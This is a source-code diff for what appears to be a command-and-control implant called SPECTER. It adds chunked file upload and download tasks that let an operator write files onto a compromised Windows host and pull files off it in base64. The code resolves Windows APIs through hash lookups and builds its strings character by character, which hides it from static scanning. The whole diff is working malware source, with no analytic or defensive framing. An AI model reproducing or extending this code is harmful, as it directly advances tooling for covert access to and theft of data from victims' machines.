@@ -23,8 +23,11 @@
 #define FILE_SHARE_READ_LOCAL       0x00000001UL
 #define FILE_SHARE_WRITE_LOCAL      0x00000002UL
 #define OPEN_EXISTING_LOCAL         3UL
+#define OPEN_ALWAYS_LOCAL           4UL
 #define CREATE_ALWAYS_LOCAL         2UL
 #define FILE_ATTRIBUTE_NORMAL_LOCAL 0x00000080UL
+#define FILE_BEGIN_LOCAL            0UL
+#define INVALID_SET_FILE_POINTER_LOCAL 0xFFFFFFFFUL
 
 static void store_task_failed_text(IMPLANT_CONTEXT *ctx, const char *task_id,
                                    const char *text, DWORD text_len);
@@ -33,7 +36,7 @@ static void store_task_failed_text(IMPLANT_CONTEXT *ctx, const char *task_id,
 /*  Dev build trace support                                            */
 /* ------------------------------------------------------------------ */
 
-#if defined(SPECTER_DEV_BUILD) && !defined(SPECTER_BAREBONE_MODULES)
+#if defined(SPECTER_DEV_BUILD)
 static void task_dev_trace(const char *msg) {
     typedef void (__attribute__((ms_abi)) *fn_Dbg)(const char *);
     PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
@@ -41,9 +44,40 @@ static void task_dev_trace(const char *msg) {
     fn_Dbg dbg = (fn_Dbg)find_export_by_hash(k32, HASH_OUTPUTDEBUGSTRINGA);
     if (dbg) dbg(msg);
 }
+
+static void task_dev_trace_val(const char *prefix, DWORD val) {
+    typedef void (__attribute__((ms_abi)) *fn_Dbg)(const char *);
+    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
+    if (!k32) return;
+    fn_Dbg dbg = (fn_Dbg)find_export_by_hash(k32, HASH_OUTPUTDEBUGSTRINGA);
+    if (!dbg) return;
+
+    char buf[128];
+    DWORD i = 0;
+    const char *p = prefix;
+    while (*p && i < 120) buf[i++] = *p++;
+    buf[i++] = ':'; buf[i++] = ' ';
+
+    char tmp[12];
+    DWORD t = 0;
+    if (val == 0) {
+        tmp[t++] = '0';
+    } else {
+        DWORD v = val;
+        while (v && t < sizeof(tmp)) {
+            tmp[t++] = (char)('0' + (v % 10));
+            v /= 10;
+        }
+    }
+    while (t > 0 && i < 126) buf[i++] = tmp[--t];
+    buf[i] = 0;
+    dbg(buf);
+}
 #define TASK_TRACE(msg) task_dev_trace(msg)
+#define TASK_TRACE_VAL(prefix, val) task_dev_trace_val((prefix), (val))
 #else
 #define TASK_TRACE(msg) ((void)0)
+#define TASK_TRACE_VAL(prefix, val) ((void)0)
 #endif
 
 /* ------------------------------------------------------------------ */
@@ -84,6 +118,8 @@ DWORD parse_task_type(const char *type_str, DWORD len) {
     char s_cmd[]         = {'c','m','d',0};
     char s_upload[]      = {'u','p','l','o','a','d',0};
     char s_download[]    = {'d','o','w','n','l','o','a','d',0};
+    char s_upload_chunk[] = {'u','p','l','o','a','d','_','c','h','u','n','k',0};
+    char s_download_chunk[] = {'d','o','w','n','l','o','a','d','_','c','h','u','n','k',0};
 
     /* Module bus tasks */
     char s_module_load[] = {'m','o','d','u','l','e','_','l','o','a','d',0};
@@ -102,6 +138,8 @@ DWORD parse_task_type(const char *type_str, DWORD len) {
     if (streq_n(type_str, len, s_cmd))         return TASK_TYPE_CMD;
     if (streq_n(type_str, len, s_upload))      return TASK_TYPE_UPLOAD;
     if (streq_n(type_str, len, s_download))    return TASK_TYPE_DOWNLOAD;
+    if (streq_n(type_str, len, s_upload_chunk)) return TASK_TYPE_UPLOAD_CHUNK;
+    if (streq_n(type_str, len, s_download_chunk)) return TASK_TYPE_DOWNLOAD_CHUNK;
 
     /* Module bus */
     if (streq_n(type_str, len, s_module_load)) return TASK_TYPE_MODULE;
@@ -631,6 +669,8 @@ static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
 
     /* Clean up the module slot */
     modmgr_cleanup(mgr, (DWORD)slot);
+    TASK_TRACE_VAL("[SPECTER] module cleanup generation",
+                   modmgr_cleanup_generation(mgr));
 
     TASK_TRACE("[SPECTER] execute_module_task: done");
 #endif
@@ -699,6 +739,43 @@ static DWORD task_b64_encode(const BYTE *in, DWORD in_len, BYTE *out, DWORD out_
         out[oi++] = '=';
     }
     return oi;
+}
+
+static BOOL task_next_line(const BYTE *data, DWORD data_len, DWORD *pos,
+                           DWORD *line_start, DWORD *line_len) {
+    if (!data || !pos || !line_start || !line_len || *pos >= data_len) return FALSE;
+    DWORD start = *pos;
+    DWORD end = start;
+    while (end < data_len && data[end] != '\n') end++;
+    *line_start = start;
+    *line_len = end - start;
+    *pos = (end < data_len) ? end + 1 : end;
+    return TRUE;
+}
+
+static BOOL task_parse_u32_dec(const BYTE *data, DWORD len, DWORD *out) {
+    if (!data || !out || len == 0) return FALSE;
+    DWORD value = 0;
+    for (DWORD i = 0; i < len; i++) {
+        BYTE c = data[i];
+        if (c < '0' || c > '9') return FALSE;
+        DWORD digit = (DWORD)(c - '0');
+        if (value > (0x7FFFFFFFUL - digit) / 10UL) return FALSE;
+        value = value * 10UL + digit;
+    }
+    *out = value;
+    return TRUE;
+}
+
+static void store_upload_ok(IMPLANT_CONTEXT *ctx, const char *task_id) {
+    char msg[] = {'u','p','l','o','a','d',' ','o','k'};
+    BYTE *out = (BYTE *)task_alloc((DWORD)sizeof(msg));
+    if (!out) {
+        store_task_result(ctx, task_id, TASK_STATUS_FAILED, NULL, 0);
+        return;
+    }
+    spec_memcpy(out, msg, sizeof(msg));
+    store_task_result(ctx, task_id, TASK_STATUS_COMPLETE, out, (DWORD)sizeof(msg));
 }
 
 /* upload args format: "<remote_path>\\n<base64_data>" */
@@ -773,14 +850,107 @@ static void handle_upload_task(IMPLANT_CONTEXT *ctx, TASK *task) {
     }
 
     /* Heap-copy message — store_task_result owns pointer; task_free_results frees it */
-    char msg[] = {'u','p','l','o','a','d',' ','o','k'};
-    BYTE *out = (BYTE *)task_alloc((DWORD)sizeof(msg));
-    if (!out) {
+    store_upload_ok(ctx, task->task_id);
+}
+
+/* upload_chunk args format: "<remote_path>\\n<offset>\\n<is_last>\\n<base64_data>" */
+static void handle_upload_chunk_task(IMPLANT_CONTEXT *ctx, TASK *task) {
+    if (!task->data || task->data_len == 0) {
         store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
         return;
     }
-    spec_memcpy(out, msg, sizeof(msg));
-    store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, out, (DWORD)sizeof(msg));
+
+    DWORD pos = 0, start = 0, len = 0;
+    if (!task_next_line(task->data, task->data_len, &pos, &start, &len) ||
+        len == 0 || len > TASK_MAX_PATH_CHARS) {
+        store_task_failed_text(ctx, task->task_id, "remote path invalid", 20);
+        return;
+    }
+
+    char path[260];
+    spec_memcpy(path, task->data + start, len);
+    path[len] = 0;
+
+    DWORD off_start = 0, off_len = 0;
+    DWORD last_start = 0, last_len = 0;
+    if (!task_next_line(task->data, task->data_len, &pos, &off_start, &off_len) ||
+        !task_next_line(task->data, task->data_len, &pos, &last_start, &last_len)) {
+        store_task_failed_text(ctx, task->task_id, "chunk metadata invalid", 23);
+        return;
+    }
+
+    DWORD offset = 0, is_last = 0;
+    if (!task_parse_u32_dec(task->data + off_start, off_len, &offset) ||
+        !task_parse_u32_dec(task->data + last_start, last_len, &is_last) ||
+        is_last > 1) {
+        store_task_failed_text(ctx, task->task_id, "chunk metadata invalid", 23);
+        return;
+    }
+
+    if (pos >= task->data_len) {
+        store_task_failed_text(ctx, task->task_id, "missing chunk data", 19);
+        return;
+    }
+
+    const BYTE *b64 = task->data + pos;
+    DWORD b64_len = task->data_len - pos;
+    DWORD alloc_size = (b64_len / 4) * 3 + 8;
+    BYTE *decoded = (BYTE *)task_alloc(alloc_size);
+    if (!decoded) {
+        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+        return;
+    }
+
+    DWORD decoded_len = 0;
+    if (!task_b64_decode(b64, b64_len, decoded, alloc_size, &decoded_len)) {
+        task_free(decoded);
+        store_task_failed_text(ctx, task->task_id, "invalid base64", 14);
+        return;
+    }
+    if (decoded_len > TASK_FILE_TRANSFER_CAP) {
+        task_free(decoded);
+        store_task_failed_text(ctx, task->task_id, "chunk larger than 1 MiB", 23);
+        return;
+    }
+
+    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
+    fn_CreateFileA pCreateFile = k32 ? (fn_CreateFileA)find_export_by_hash(k32, HASH_CREATEFILEA) : NULL;
+    fn_WriteFile pWriteFile = k32 ? (fn_WriteFile)find_export_by_hash(k32, HASH_WRITEFILE) : NULL;
+    fn_SetFilePointer pSetFilePointer = k32 ? (fn_SetFilePointer)find_export_by_hash(k32, HASH_SETFILEPOINTER) : NULL;
+    fn_CloseHandle pClose = k32 ? (fn_CloseHandle)find_export_by_hash(k32, HASH_CLOSEHANDLE) : NULL;
+    if (!pCreateFile || !pWriteFile || !pSetFilePointer || !pClose) {
+        task_free(decoded);
+        store_task_failed_text(ctx, task->task_id, "resolve API failed", 18);
+        return;
+    }
+
+    DWORD disposition = (offset == 0) ? CREATE_ALWAYS_LOCAL : OPEN_ALWAYS_LOCAL;
+    HANDLE h = pCreateFile(path, GENERIC_WRITE_LOCAL, FILE_SHARE_READ_LOCAL,
+                           NULL, disposition, FILE_ATTRIBUTE_NORMAL_LOCAL, NULL);
+    if (h == INVALID_HANDLE_VALUE_LOCAL) {
+        task_free(decoded);
+        store_task_failed_text(ctx, task->task_id, "cannot create file", 18);
+        return;
+    }
+
+    if (pSetFilePointer(h, (LONG)offset, NULL, FILE_BEGIN_LOCAL) == INVALID_SET_FILE_POINTER_LOCAL) {
+        pClose(h);
+        task_free(decoded);
+        store_task_failed_text(ctx, task->task_id, "seek failed", 12);
+        return;
+    }
+
+    DWORD written = 0;
+    BOOL ok = pWriteFile(h, decoded, decoded_len, &written, NULL);
+    pClose(h);
+    task_free(decoded);
+    if (!ok || written != decoded_len) {
+        store_task_failed_text(ctx, task->task_id, "write failed", 12);
+        return;
+    }
+
+    (void)is_last;
+    store_upload_ok(ctx, task->task_id);
 }
 
 /* download args format: "<remote_path>" ; result data is base64 file bytes */
@@ -866,6 +1036,108 @@ static void handle_download_task(IMPLANT_CONTEXT *ctx, TASK *task) {
     store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, b64, out_len);
 }
 
+/* download_chunk args format: "<remote_path>\\n<offset>\\n<size>" ; result data is base64 chunk bytes */
+static void handle_download_chunk_task(IMPLANT_CONTEXT *ctx, TASK *task) {
+    if (!task->data || task->data_len == 0) {
+        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+        return;
+    }
+
+    DWORD pos = 0, start = 0, len = 0;
+    if (!task_next_line(task->data, task->data_len, &pos, &start, &len) ||
+        len == 0 || len > TASK_MAX_PATH_CHARS) {
+        store_task_failed_text(ctx, task->task_id, "remote path invalid", 20);
+        return;
+    }
+
+    char path[260];
+    spec_memcpy(path, task->data + start, len);
+    path[len] = 0;
+
+    DWORD off_start = 0, off_len = 0;
+    DWORD size_start = 0, size_len = 0;
+    if (!task_next_line(task->data, task->data_len, &pos, &off_start, &off_len) ||
+        !task_next_line(task->data, task->data_len, &pos, &size_start, &size_len)) {
+        store_task_failed_text(ctx, task->task_id, "chunk metadata invalid", 23);
+        return;
+    }
+
+    DWORD offset = 0, requested = 0;
+    if (!task_parse_u32_dec(task->data + off_start, off_len, &offset) ||
+        !task_parse_u32_dec(task->data + size_start, size_len, &requested) ||
+        requested == 0 || requested > TASK_FILE_TRANSFER_CAP) {
+        store_task_failed_text(ctx, task->task_id, "chunk metadata invalid", 23);
+        return;
+    }
+
+    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
+    fn_CreateFileA pCreateFile = k32 ? (fn_CreateFileA)find_export_by_hash(k32, HASH_CREATEFILEA) : NULL;
+    fn_GetFileSize pGetSize = k32 ? (fn_GetFileSize)find_export_by_hash(k32, HASH_GETFILESIZE) : NULL;
+    fn_ReadFile pReadFile = k32 ? (fn_ReadFile)find_export_by_hash(k32, HASH_READFILE) : NULL;
+    fn_SetFilePointer pSetFilePointer = k32 ? (fn_SetFilePointer)find_export_by_hash(k32, HASH_SETFILEPOINTER) : NULL;
+    fn_CloseHandle pClose = k32 ? (fn_CloseHandle)find_export_by_hash(k32, HASH_CLOSEHANDLE) : NULL;
+    if (!pCreateFile || !pGetSize || !pReadFile || !pSetFilePointer || !pClose) {
+        store_task_failed_text(ctx, task->task_id, "resolve API failed", 18);
+        return;
+    }
+
+    HANDLE h = pCreateFile(path, GENERIC_READ_LOCAL, FILE_SHARE_READ_LOCAL | FILE_SHARE_WRITE_LOCAL,
+                           NULL, OPEN_EXISTING_LOCAL, FILE_ATTRIBUTE_NORMAL_LOCAL, NULL);
+    if (h == INVALID_HANDLE_VALUE_LOCAL) {
+        store_task_failed_text(ctx, task->task_id, "cannot open file", 16);
+        return;
+    }
+
+    DWORD hi = 0;
+    DWORD file_size = pGetSize(h, &hi);
+    if (hi != 0 || file_size == 0xFFFFFFFF || offset >= file_size) {
+        pClose(h);
+        store_task_failed_text(ctx, task->task_id, "offset beyond file", 19);
+        return;
+    }
+
+    DWORD to_read = requested;
+    if (to_read > file_size - offset) {
+        to_read = file_size - offset;
+    }
+    if (pSetFilePointer(h, (LONG)offset, NULL, FILE_BEGIN_LOCAL) == INVALID_SET_FILE_POINTER_LOCAL) {
+        pClose(h);
+        store_task_failed_text(ctx, task->task_id, "seek failed", 12);
+        return;
+    }
+
+    BYTE *raw = (BYTE *)task_alloc(to_read);
+    if (!raw) {
+        pClose(h);
+        store_task_failed_text(ctx, task->task_id, "out of memory", 13);
+        return;
+    }
+    DWORD read = 0;
+    BOOL ok = pReadFile(h, raw, to_read, &read, NULL);
+    pClose(h);
+    if (!ok || read != to_read) {
+        task_free(raw);
+        store_task_failed_text(ctx, task->task_id, "read failed", 11);
+        return;
+    }
+
+    DWORD out_max = ((to_read + 2) / 3) * 4 + 8;
+    BYTE *b64 = (BYTE *)task_alloc(out_max);
+    if (!b64) {
+        task_free(raw);
+        store_task_failed_text(ctx, task->task_id, "out of memory", 13);
+        return;
+    }
+    DWORD out_len = task_b64_encode(raw, to_read, b64, out_max);
+    task_free(raw);
+    if (out_len == 0) {
+        task_free(b64);
+        store_task_failed_text(ctx, task->task_id, "base64 encode failed", 20);
+        return;
+    }
+    store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, b64, out_len);
+}
+
 /* ------------------------------------------------------------------ */
 /*  Task dispatcher                                                    */
 /* ------------------------------------------------------------------ */
@@ -903,6 +1175,14 @@ void execute_task(IMPLANT_CONTEXT *ctx, TASK *task) {
 
     case TASK_TYPE_DOWNLOAD:
         handle_download_task(ctx, task);
+        break;
+
+    case TASK_TYPE_UPLOAD_CHUNK:
+        handle_upload_chunk_task(ctx, task);
+        break;
+
+    case TASK_TYPE_DOWNLOAD_CHUNK:
+        handle_download_chunk_task(ctx, task);
         break;
 
     /* ---- Module bus tasks ---- */
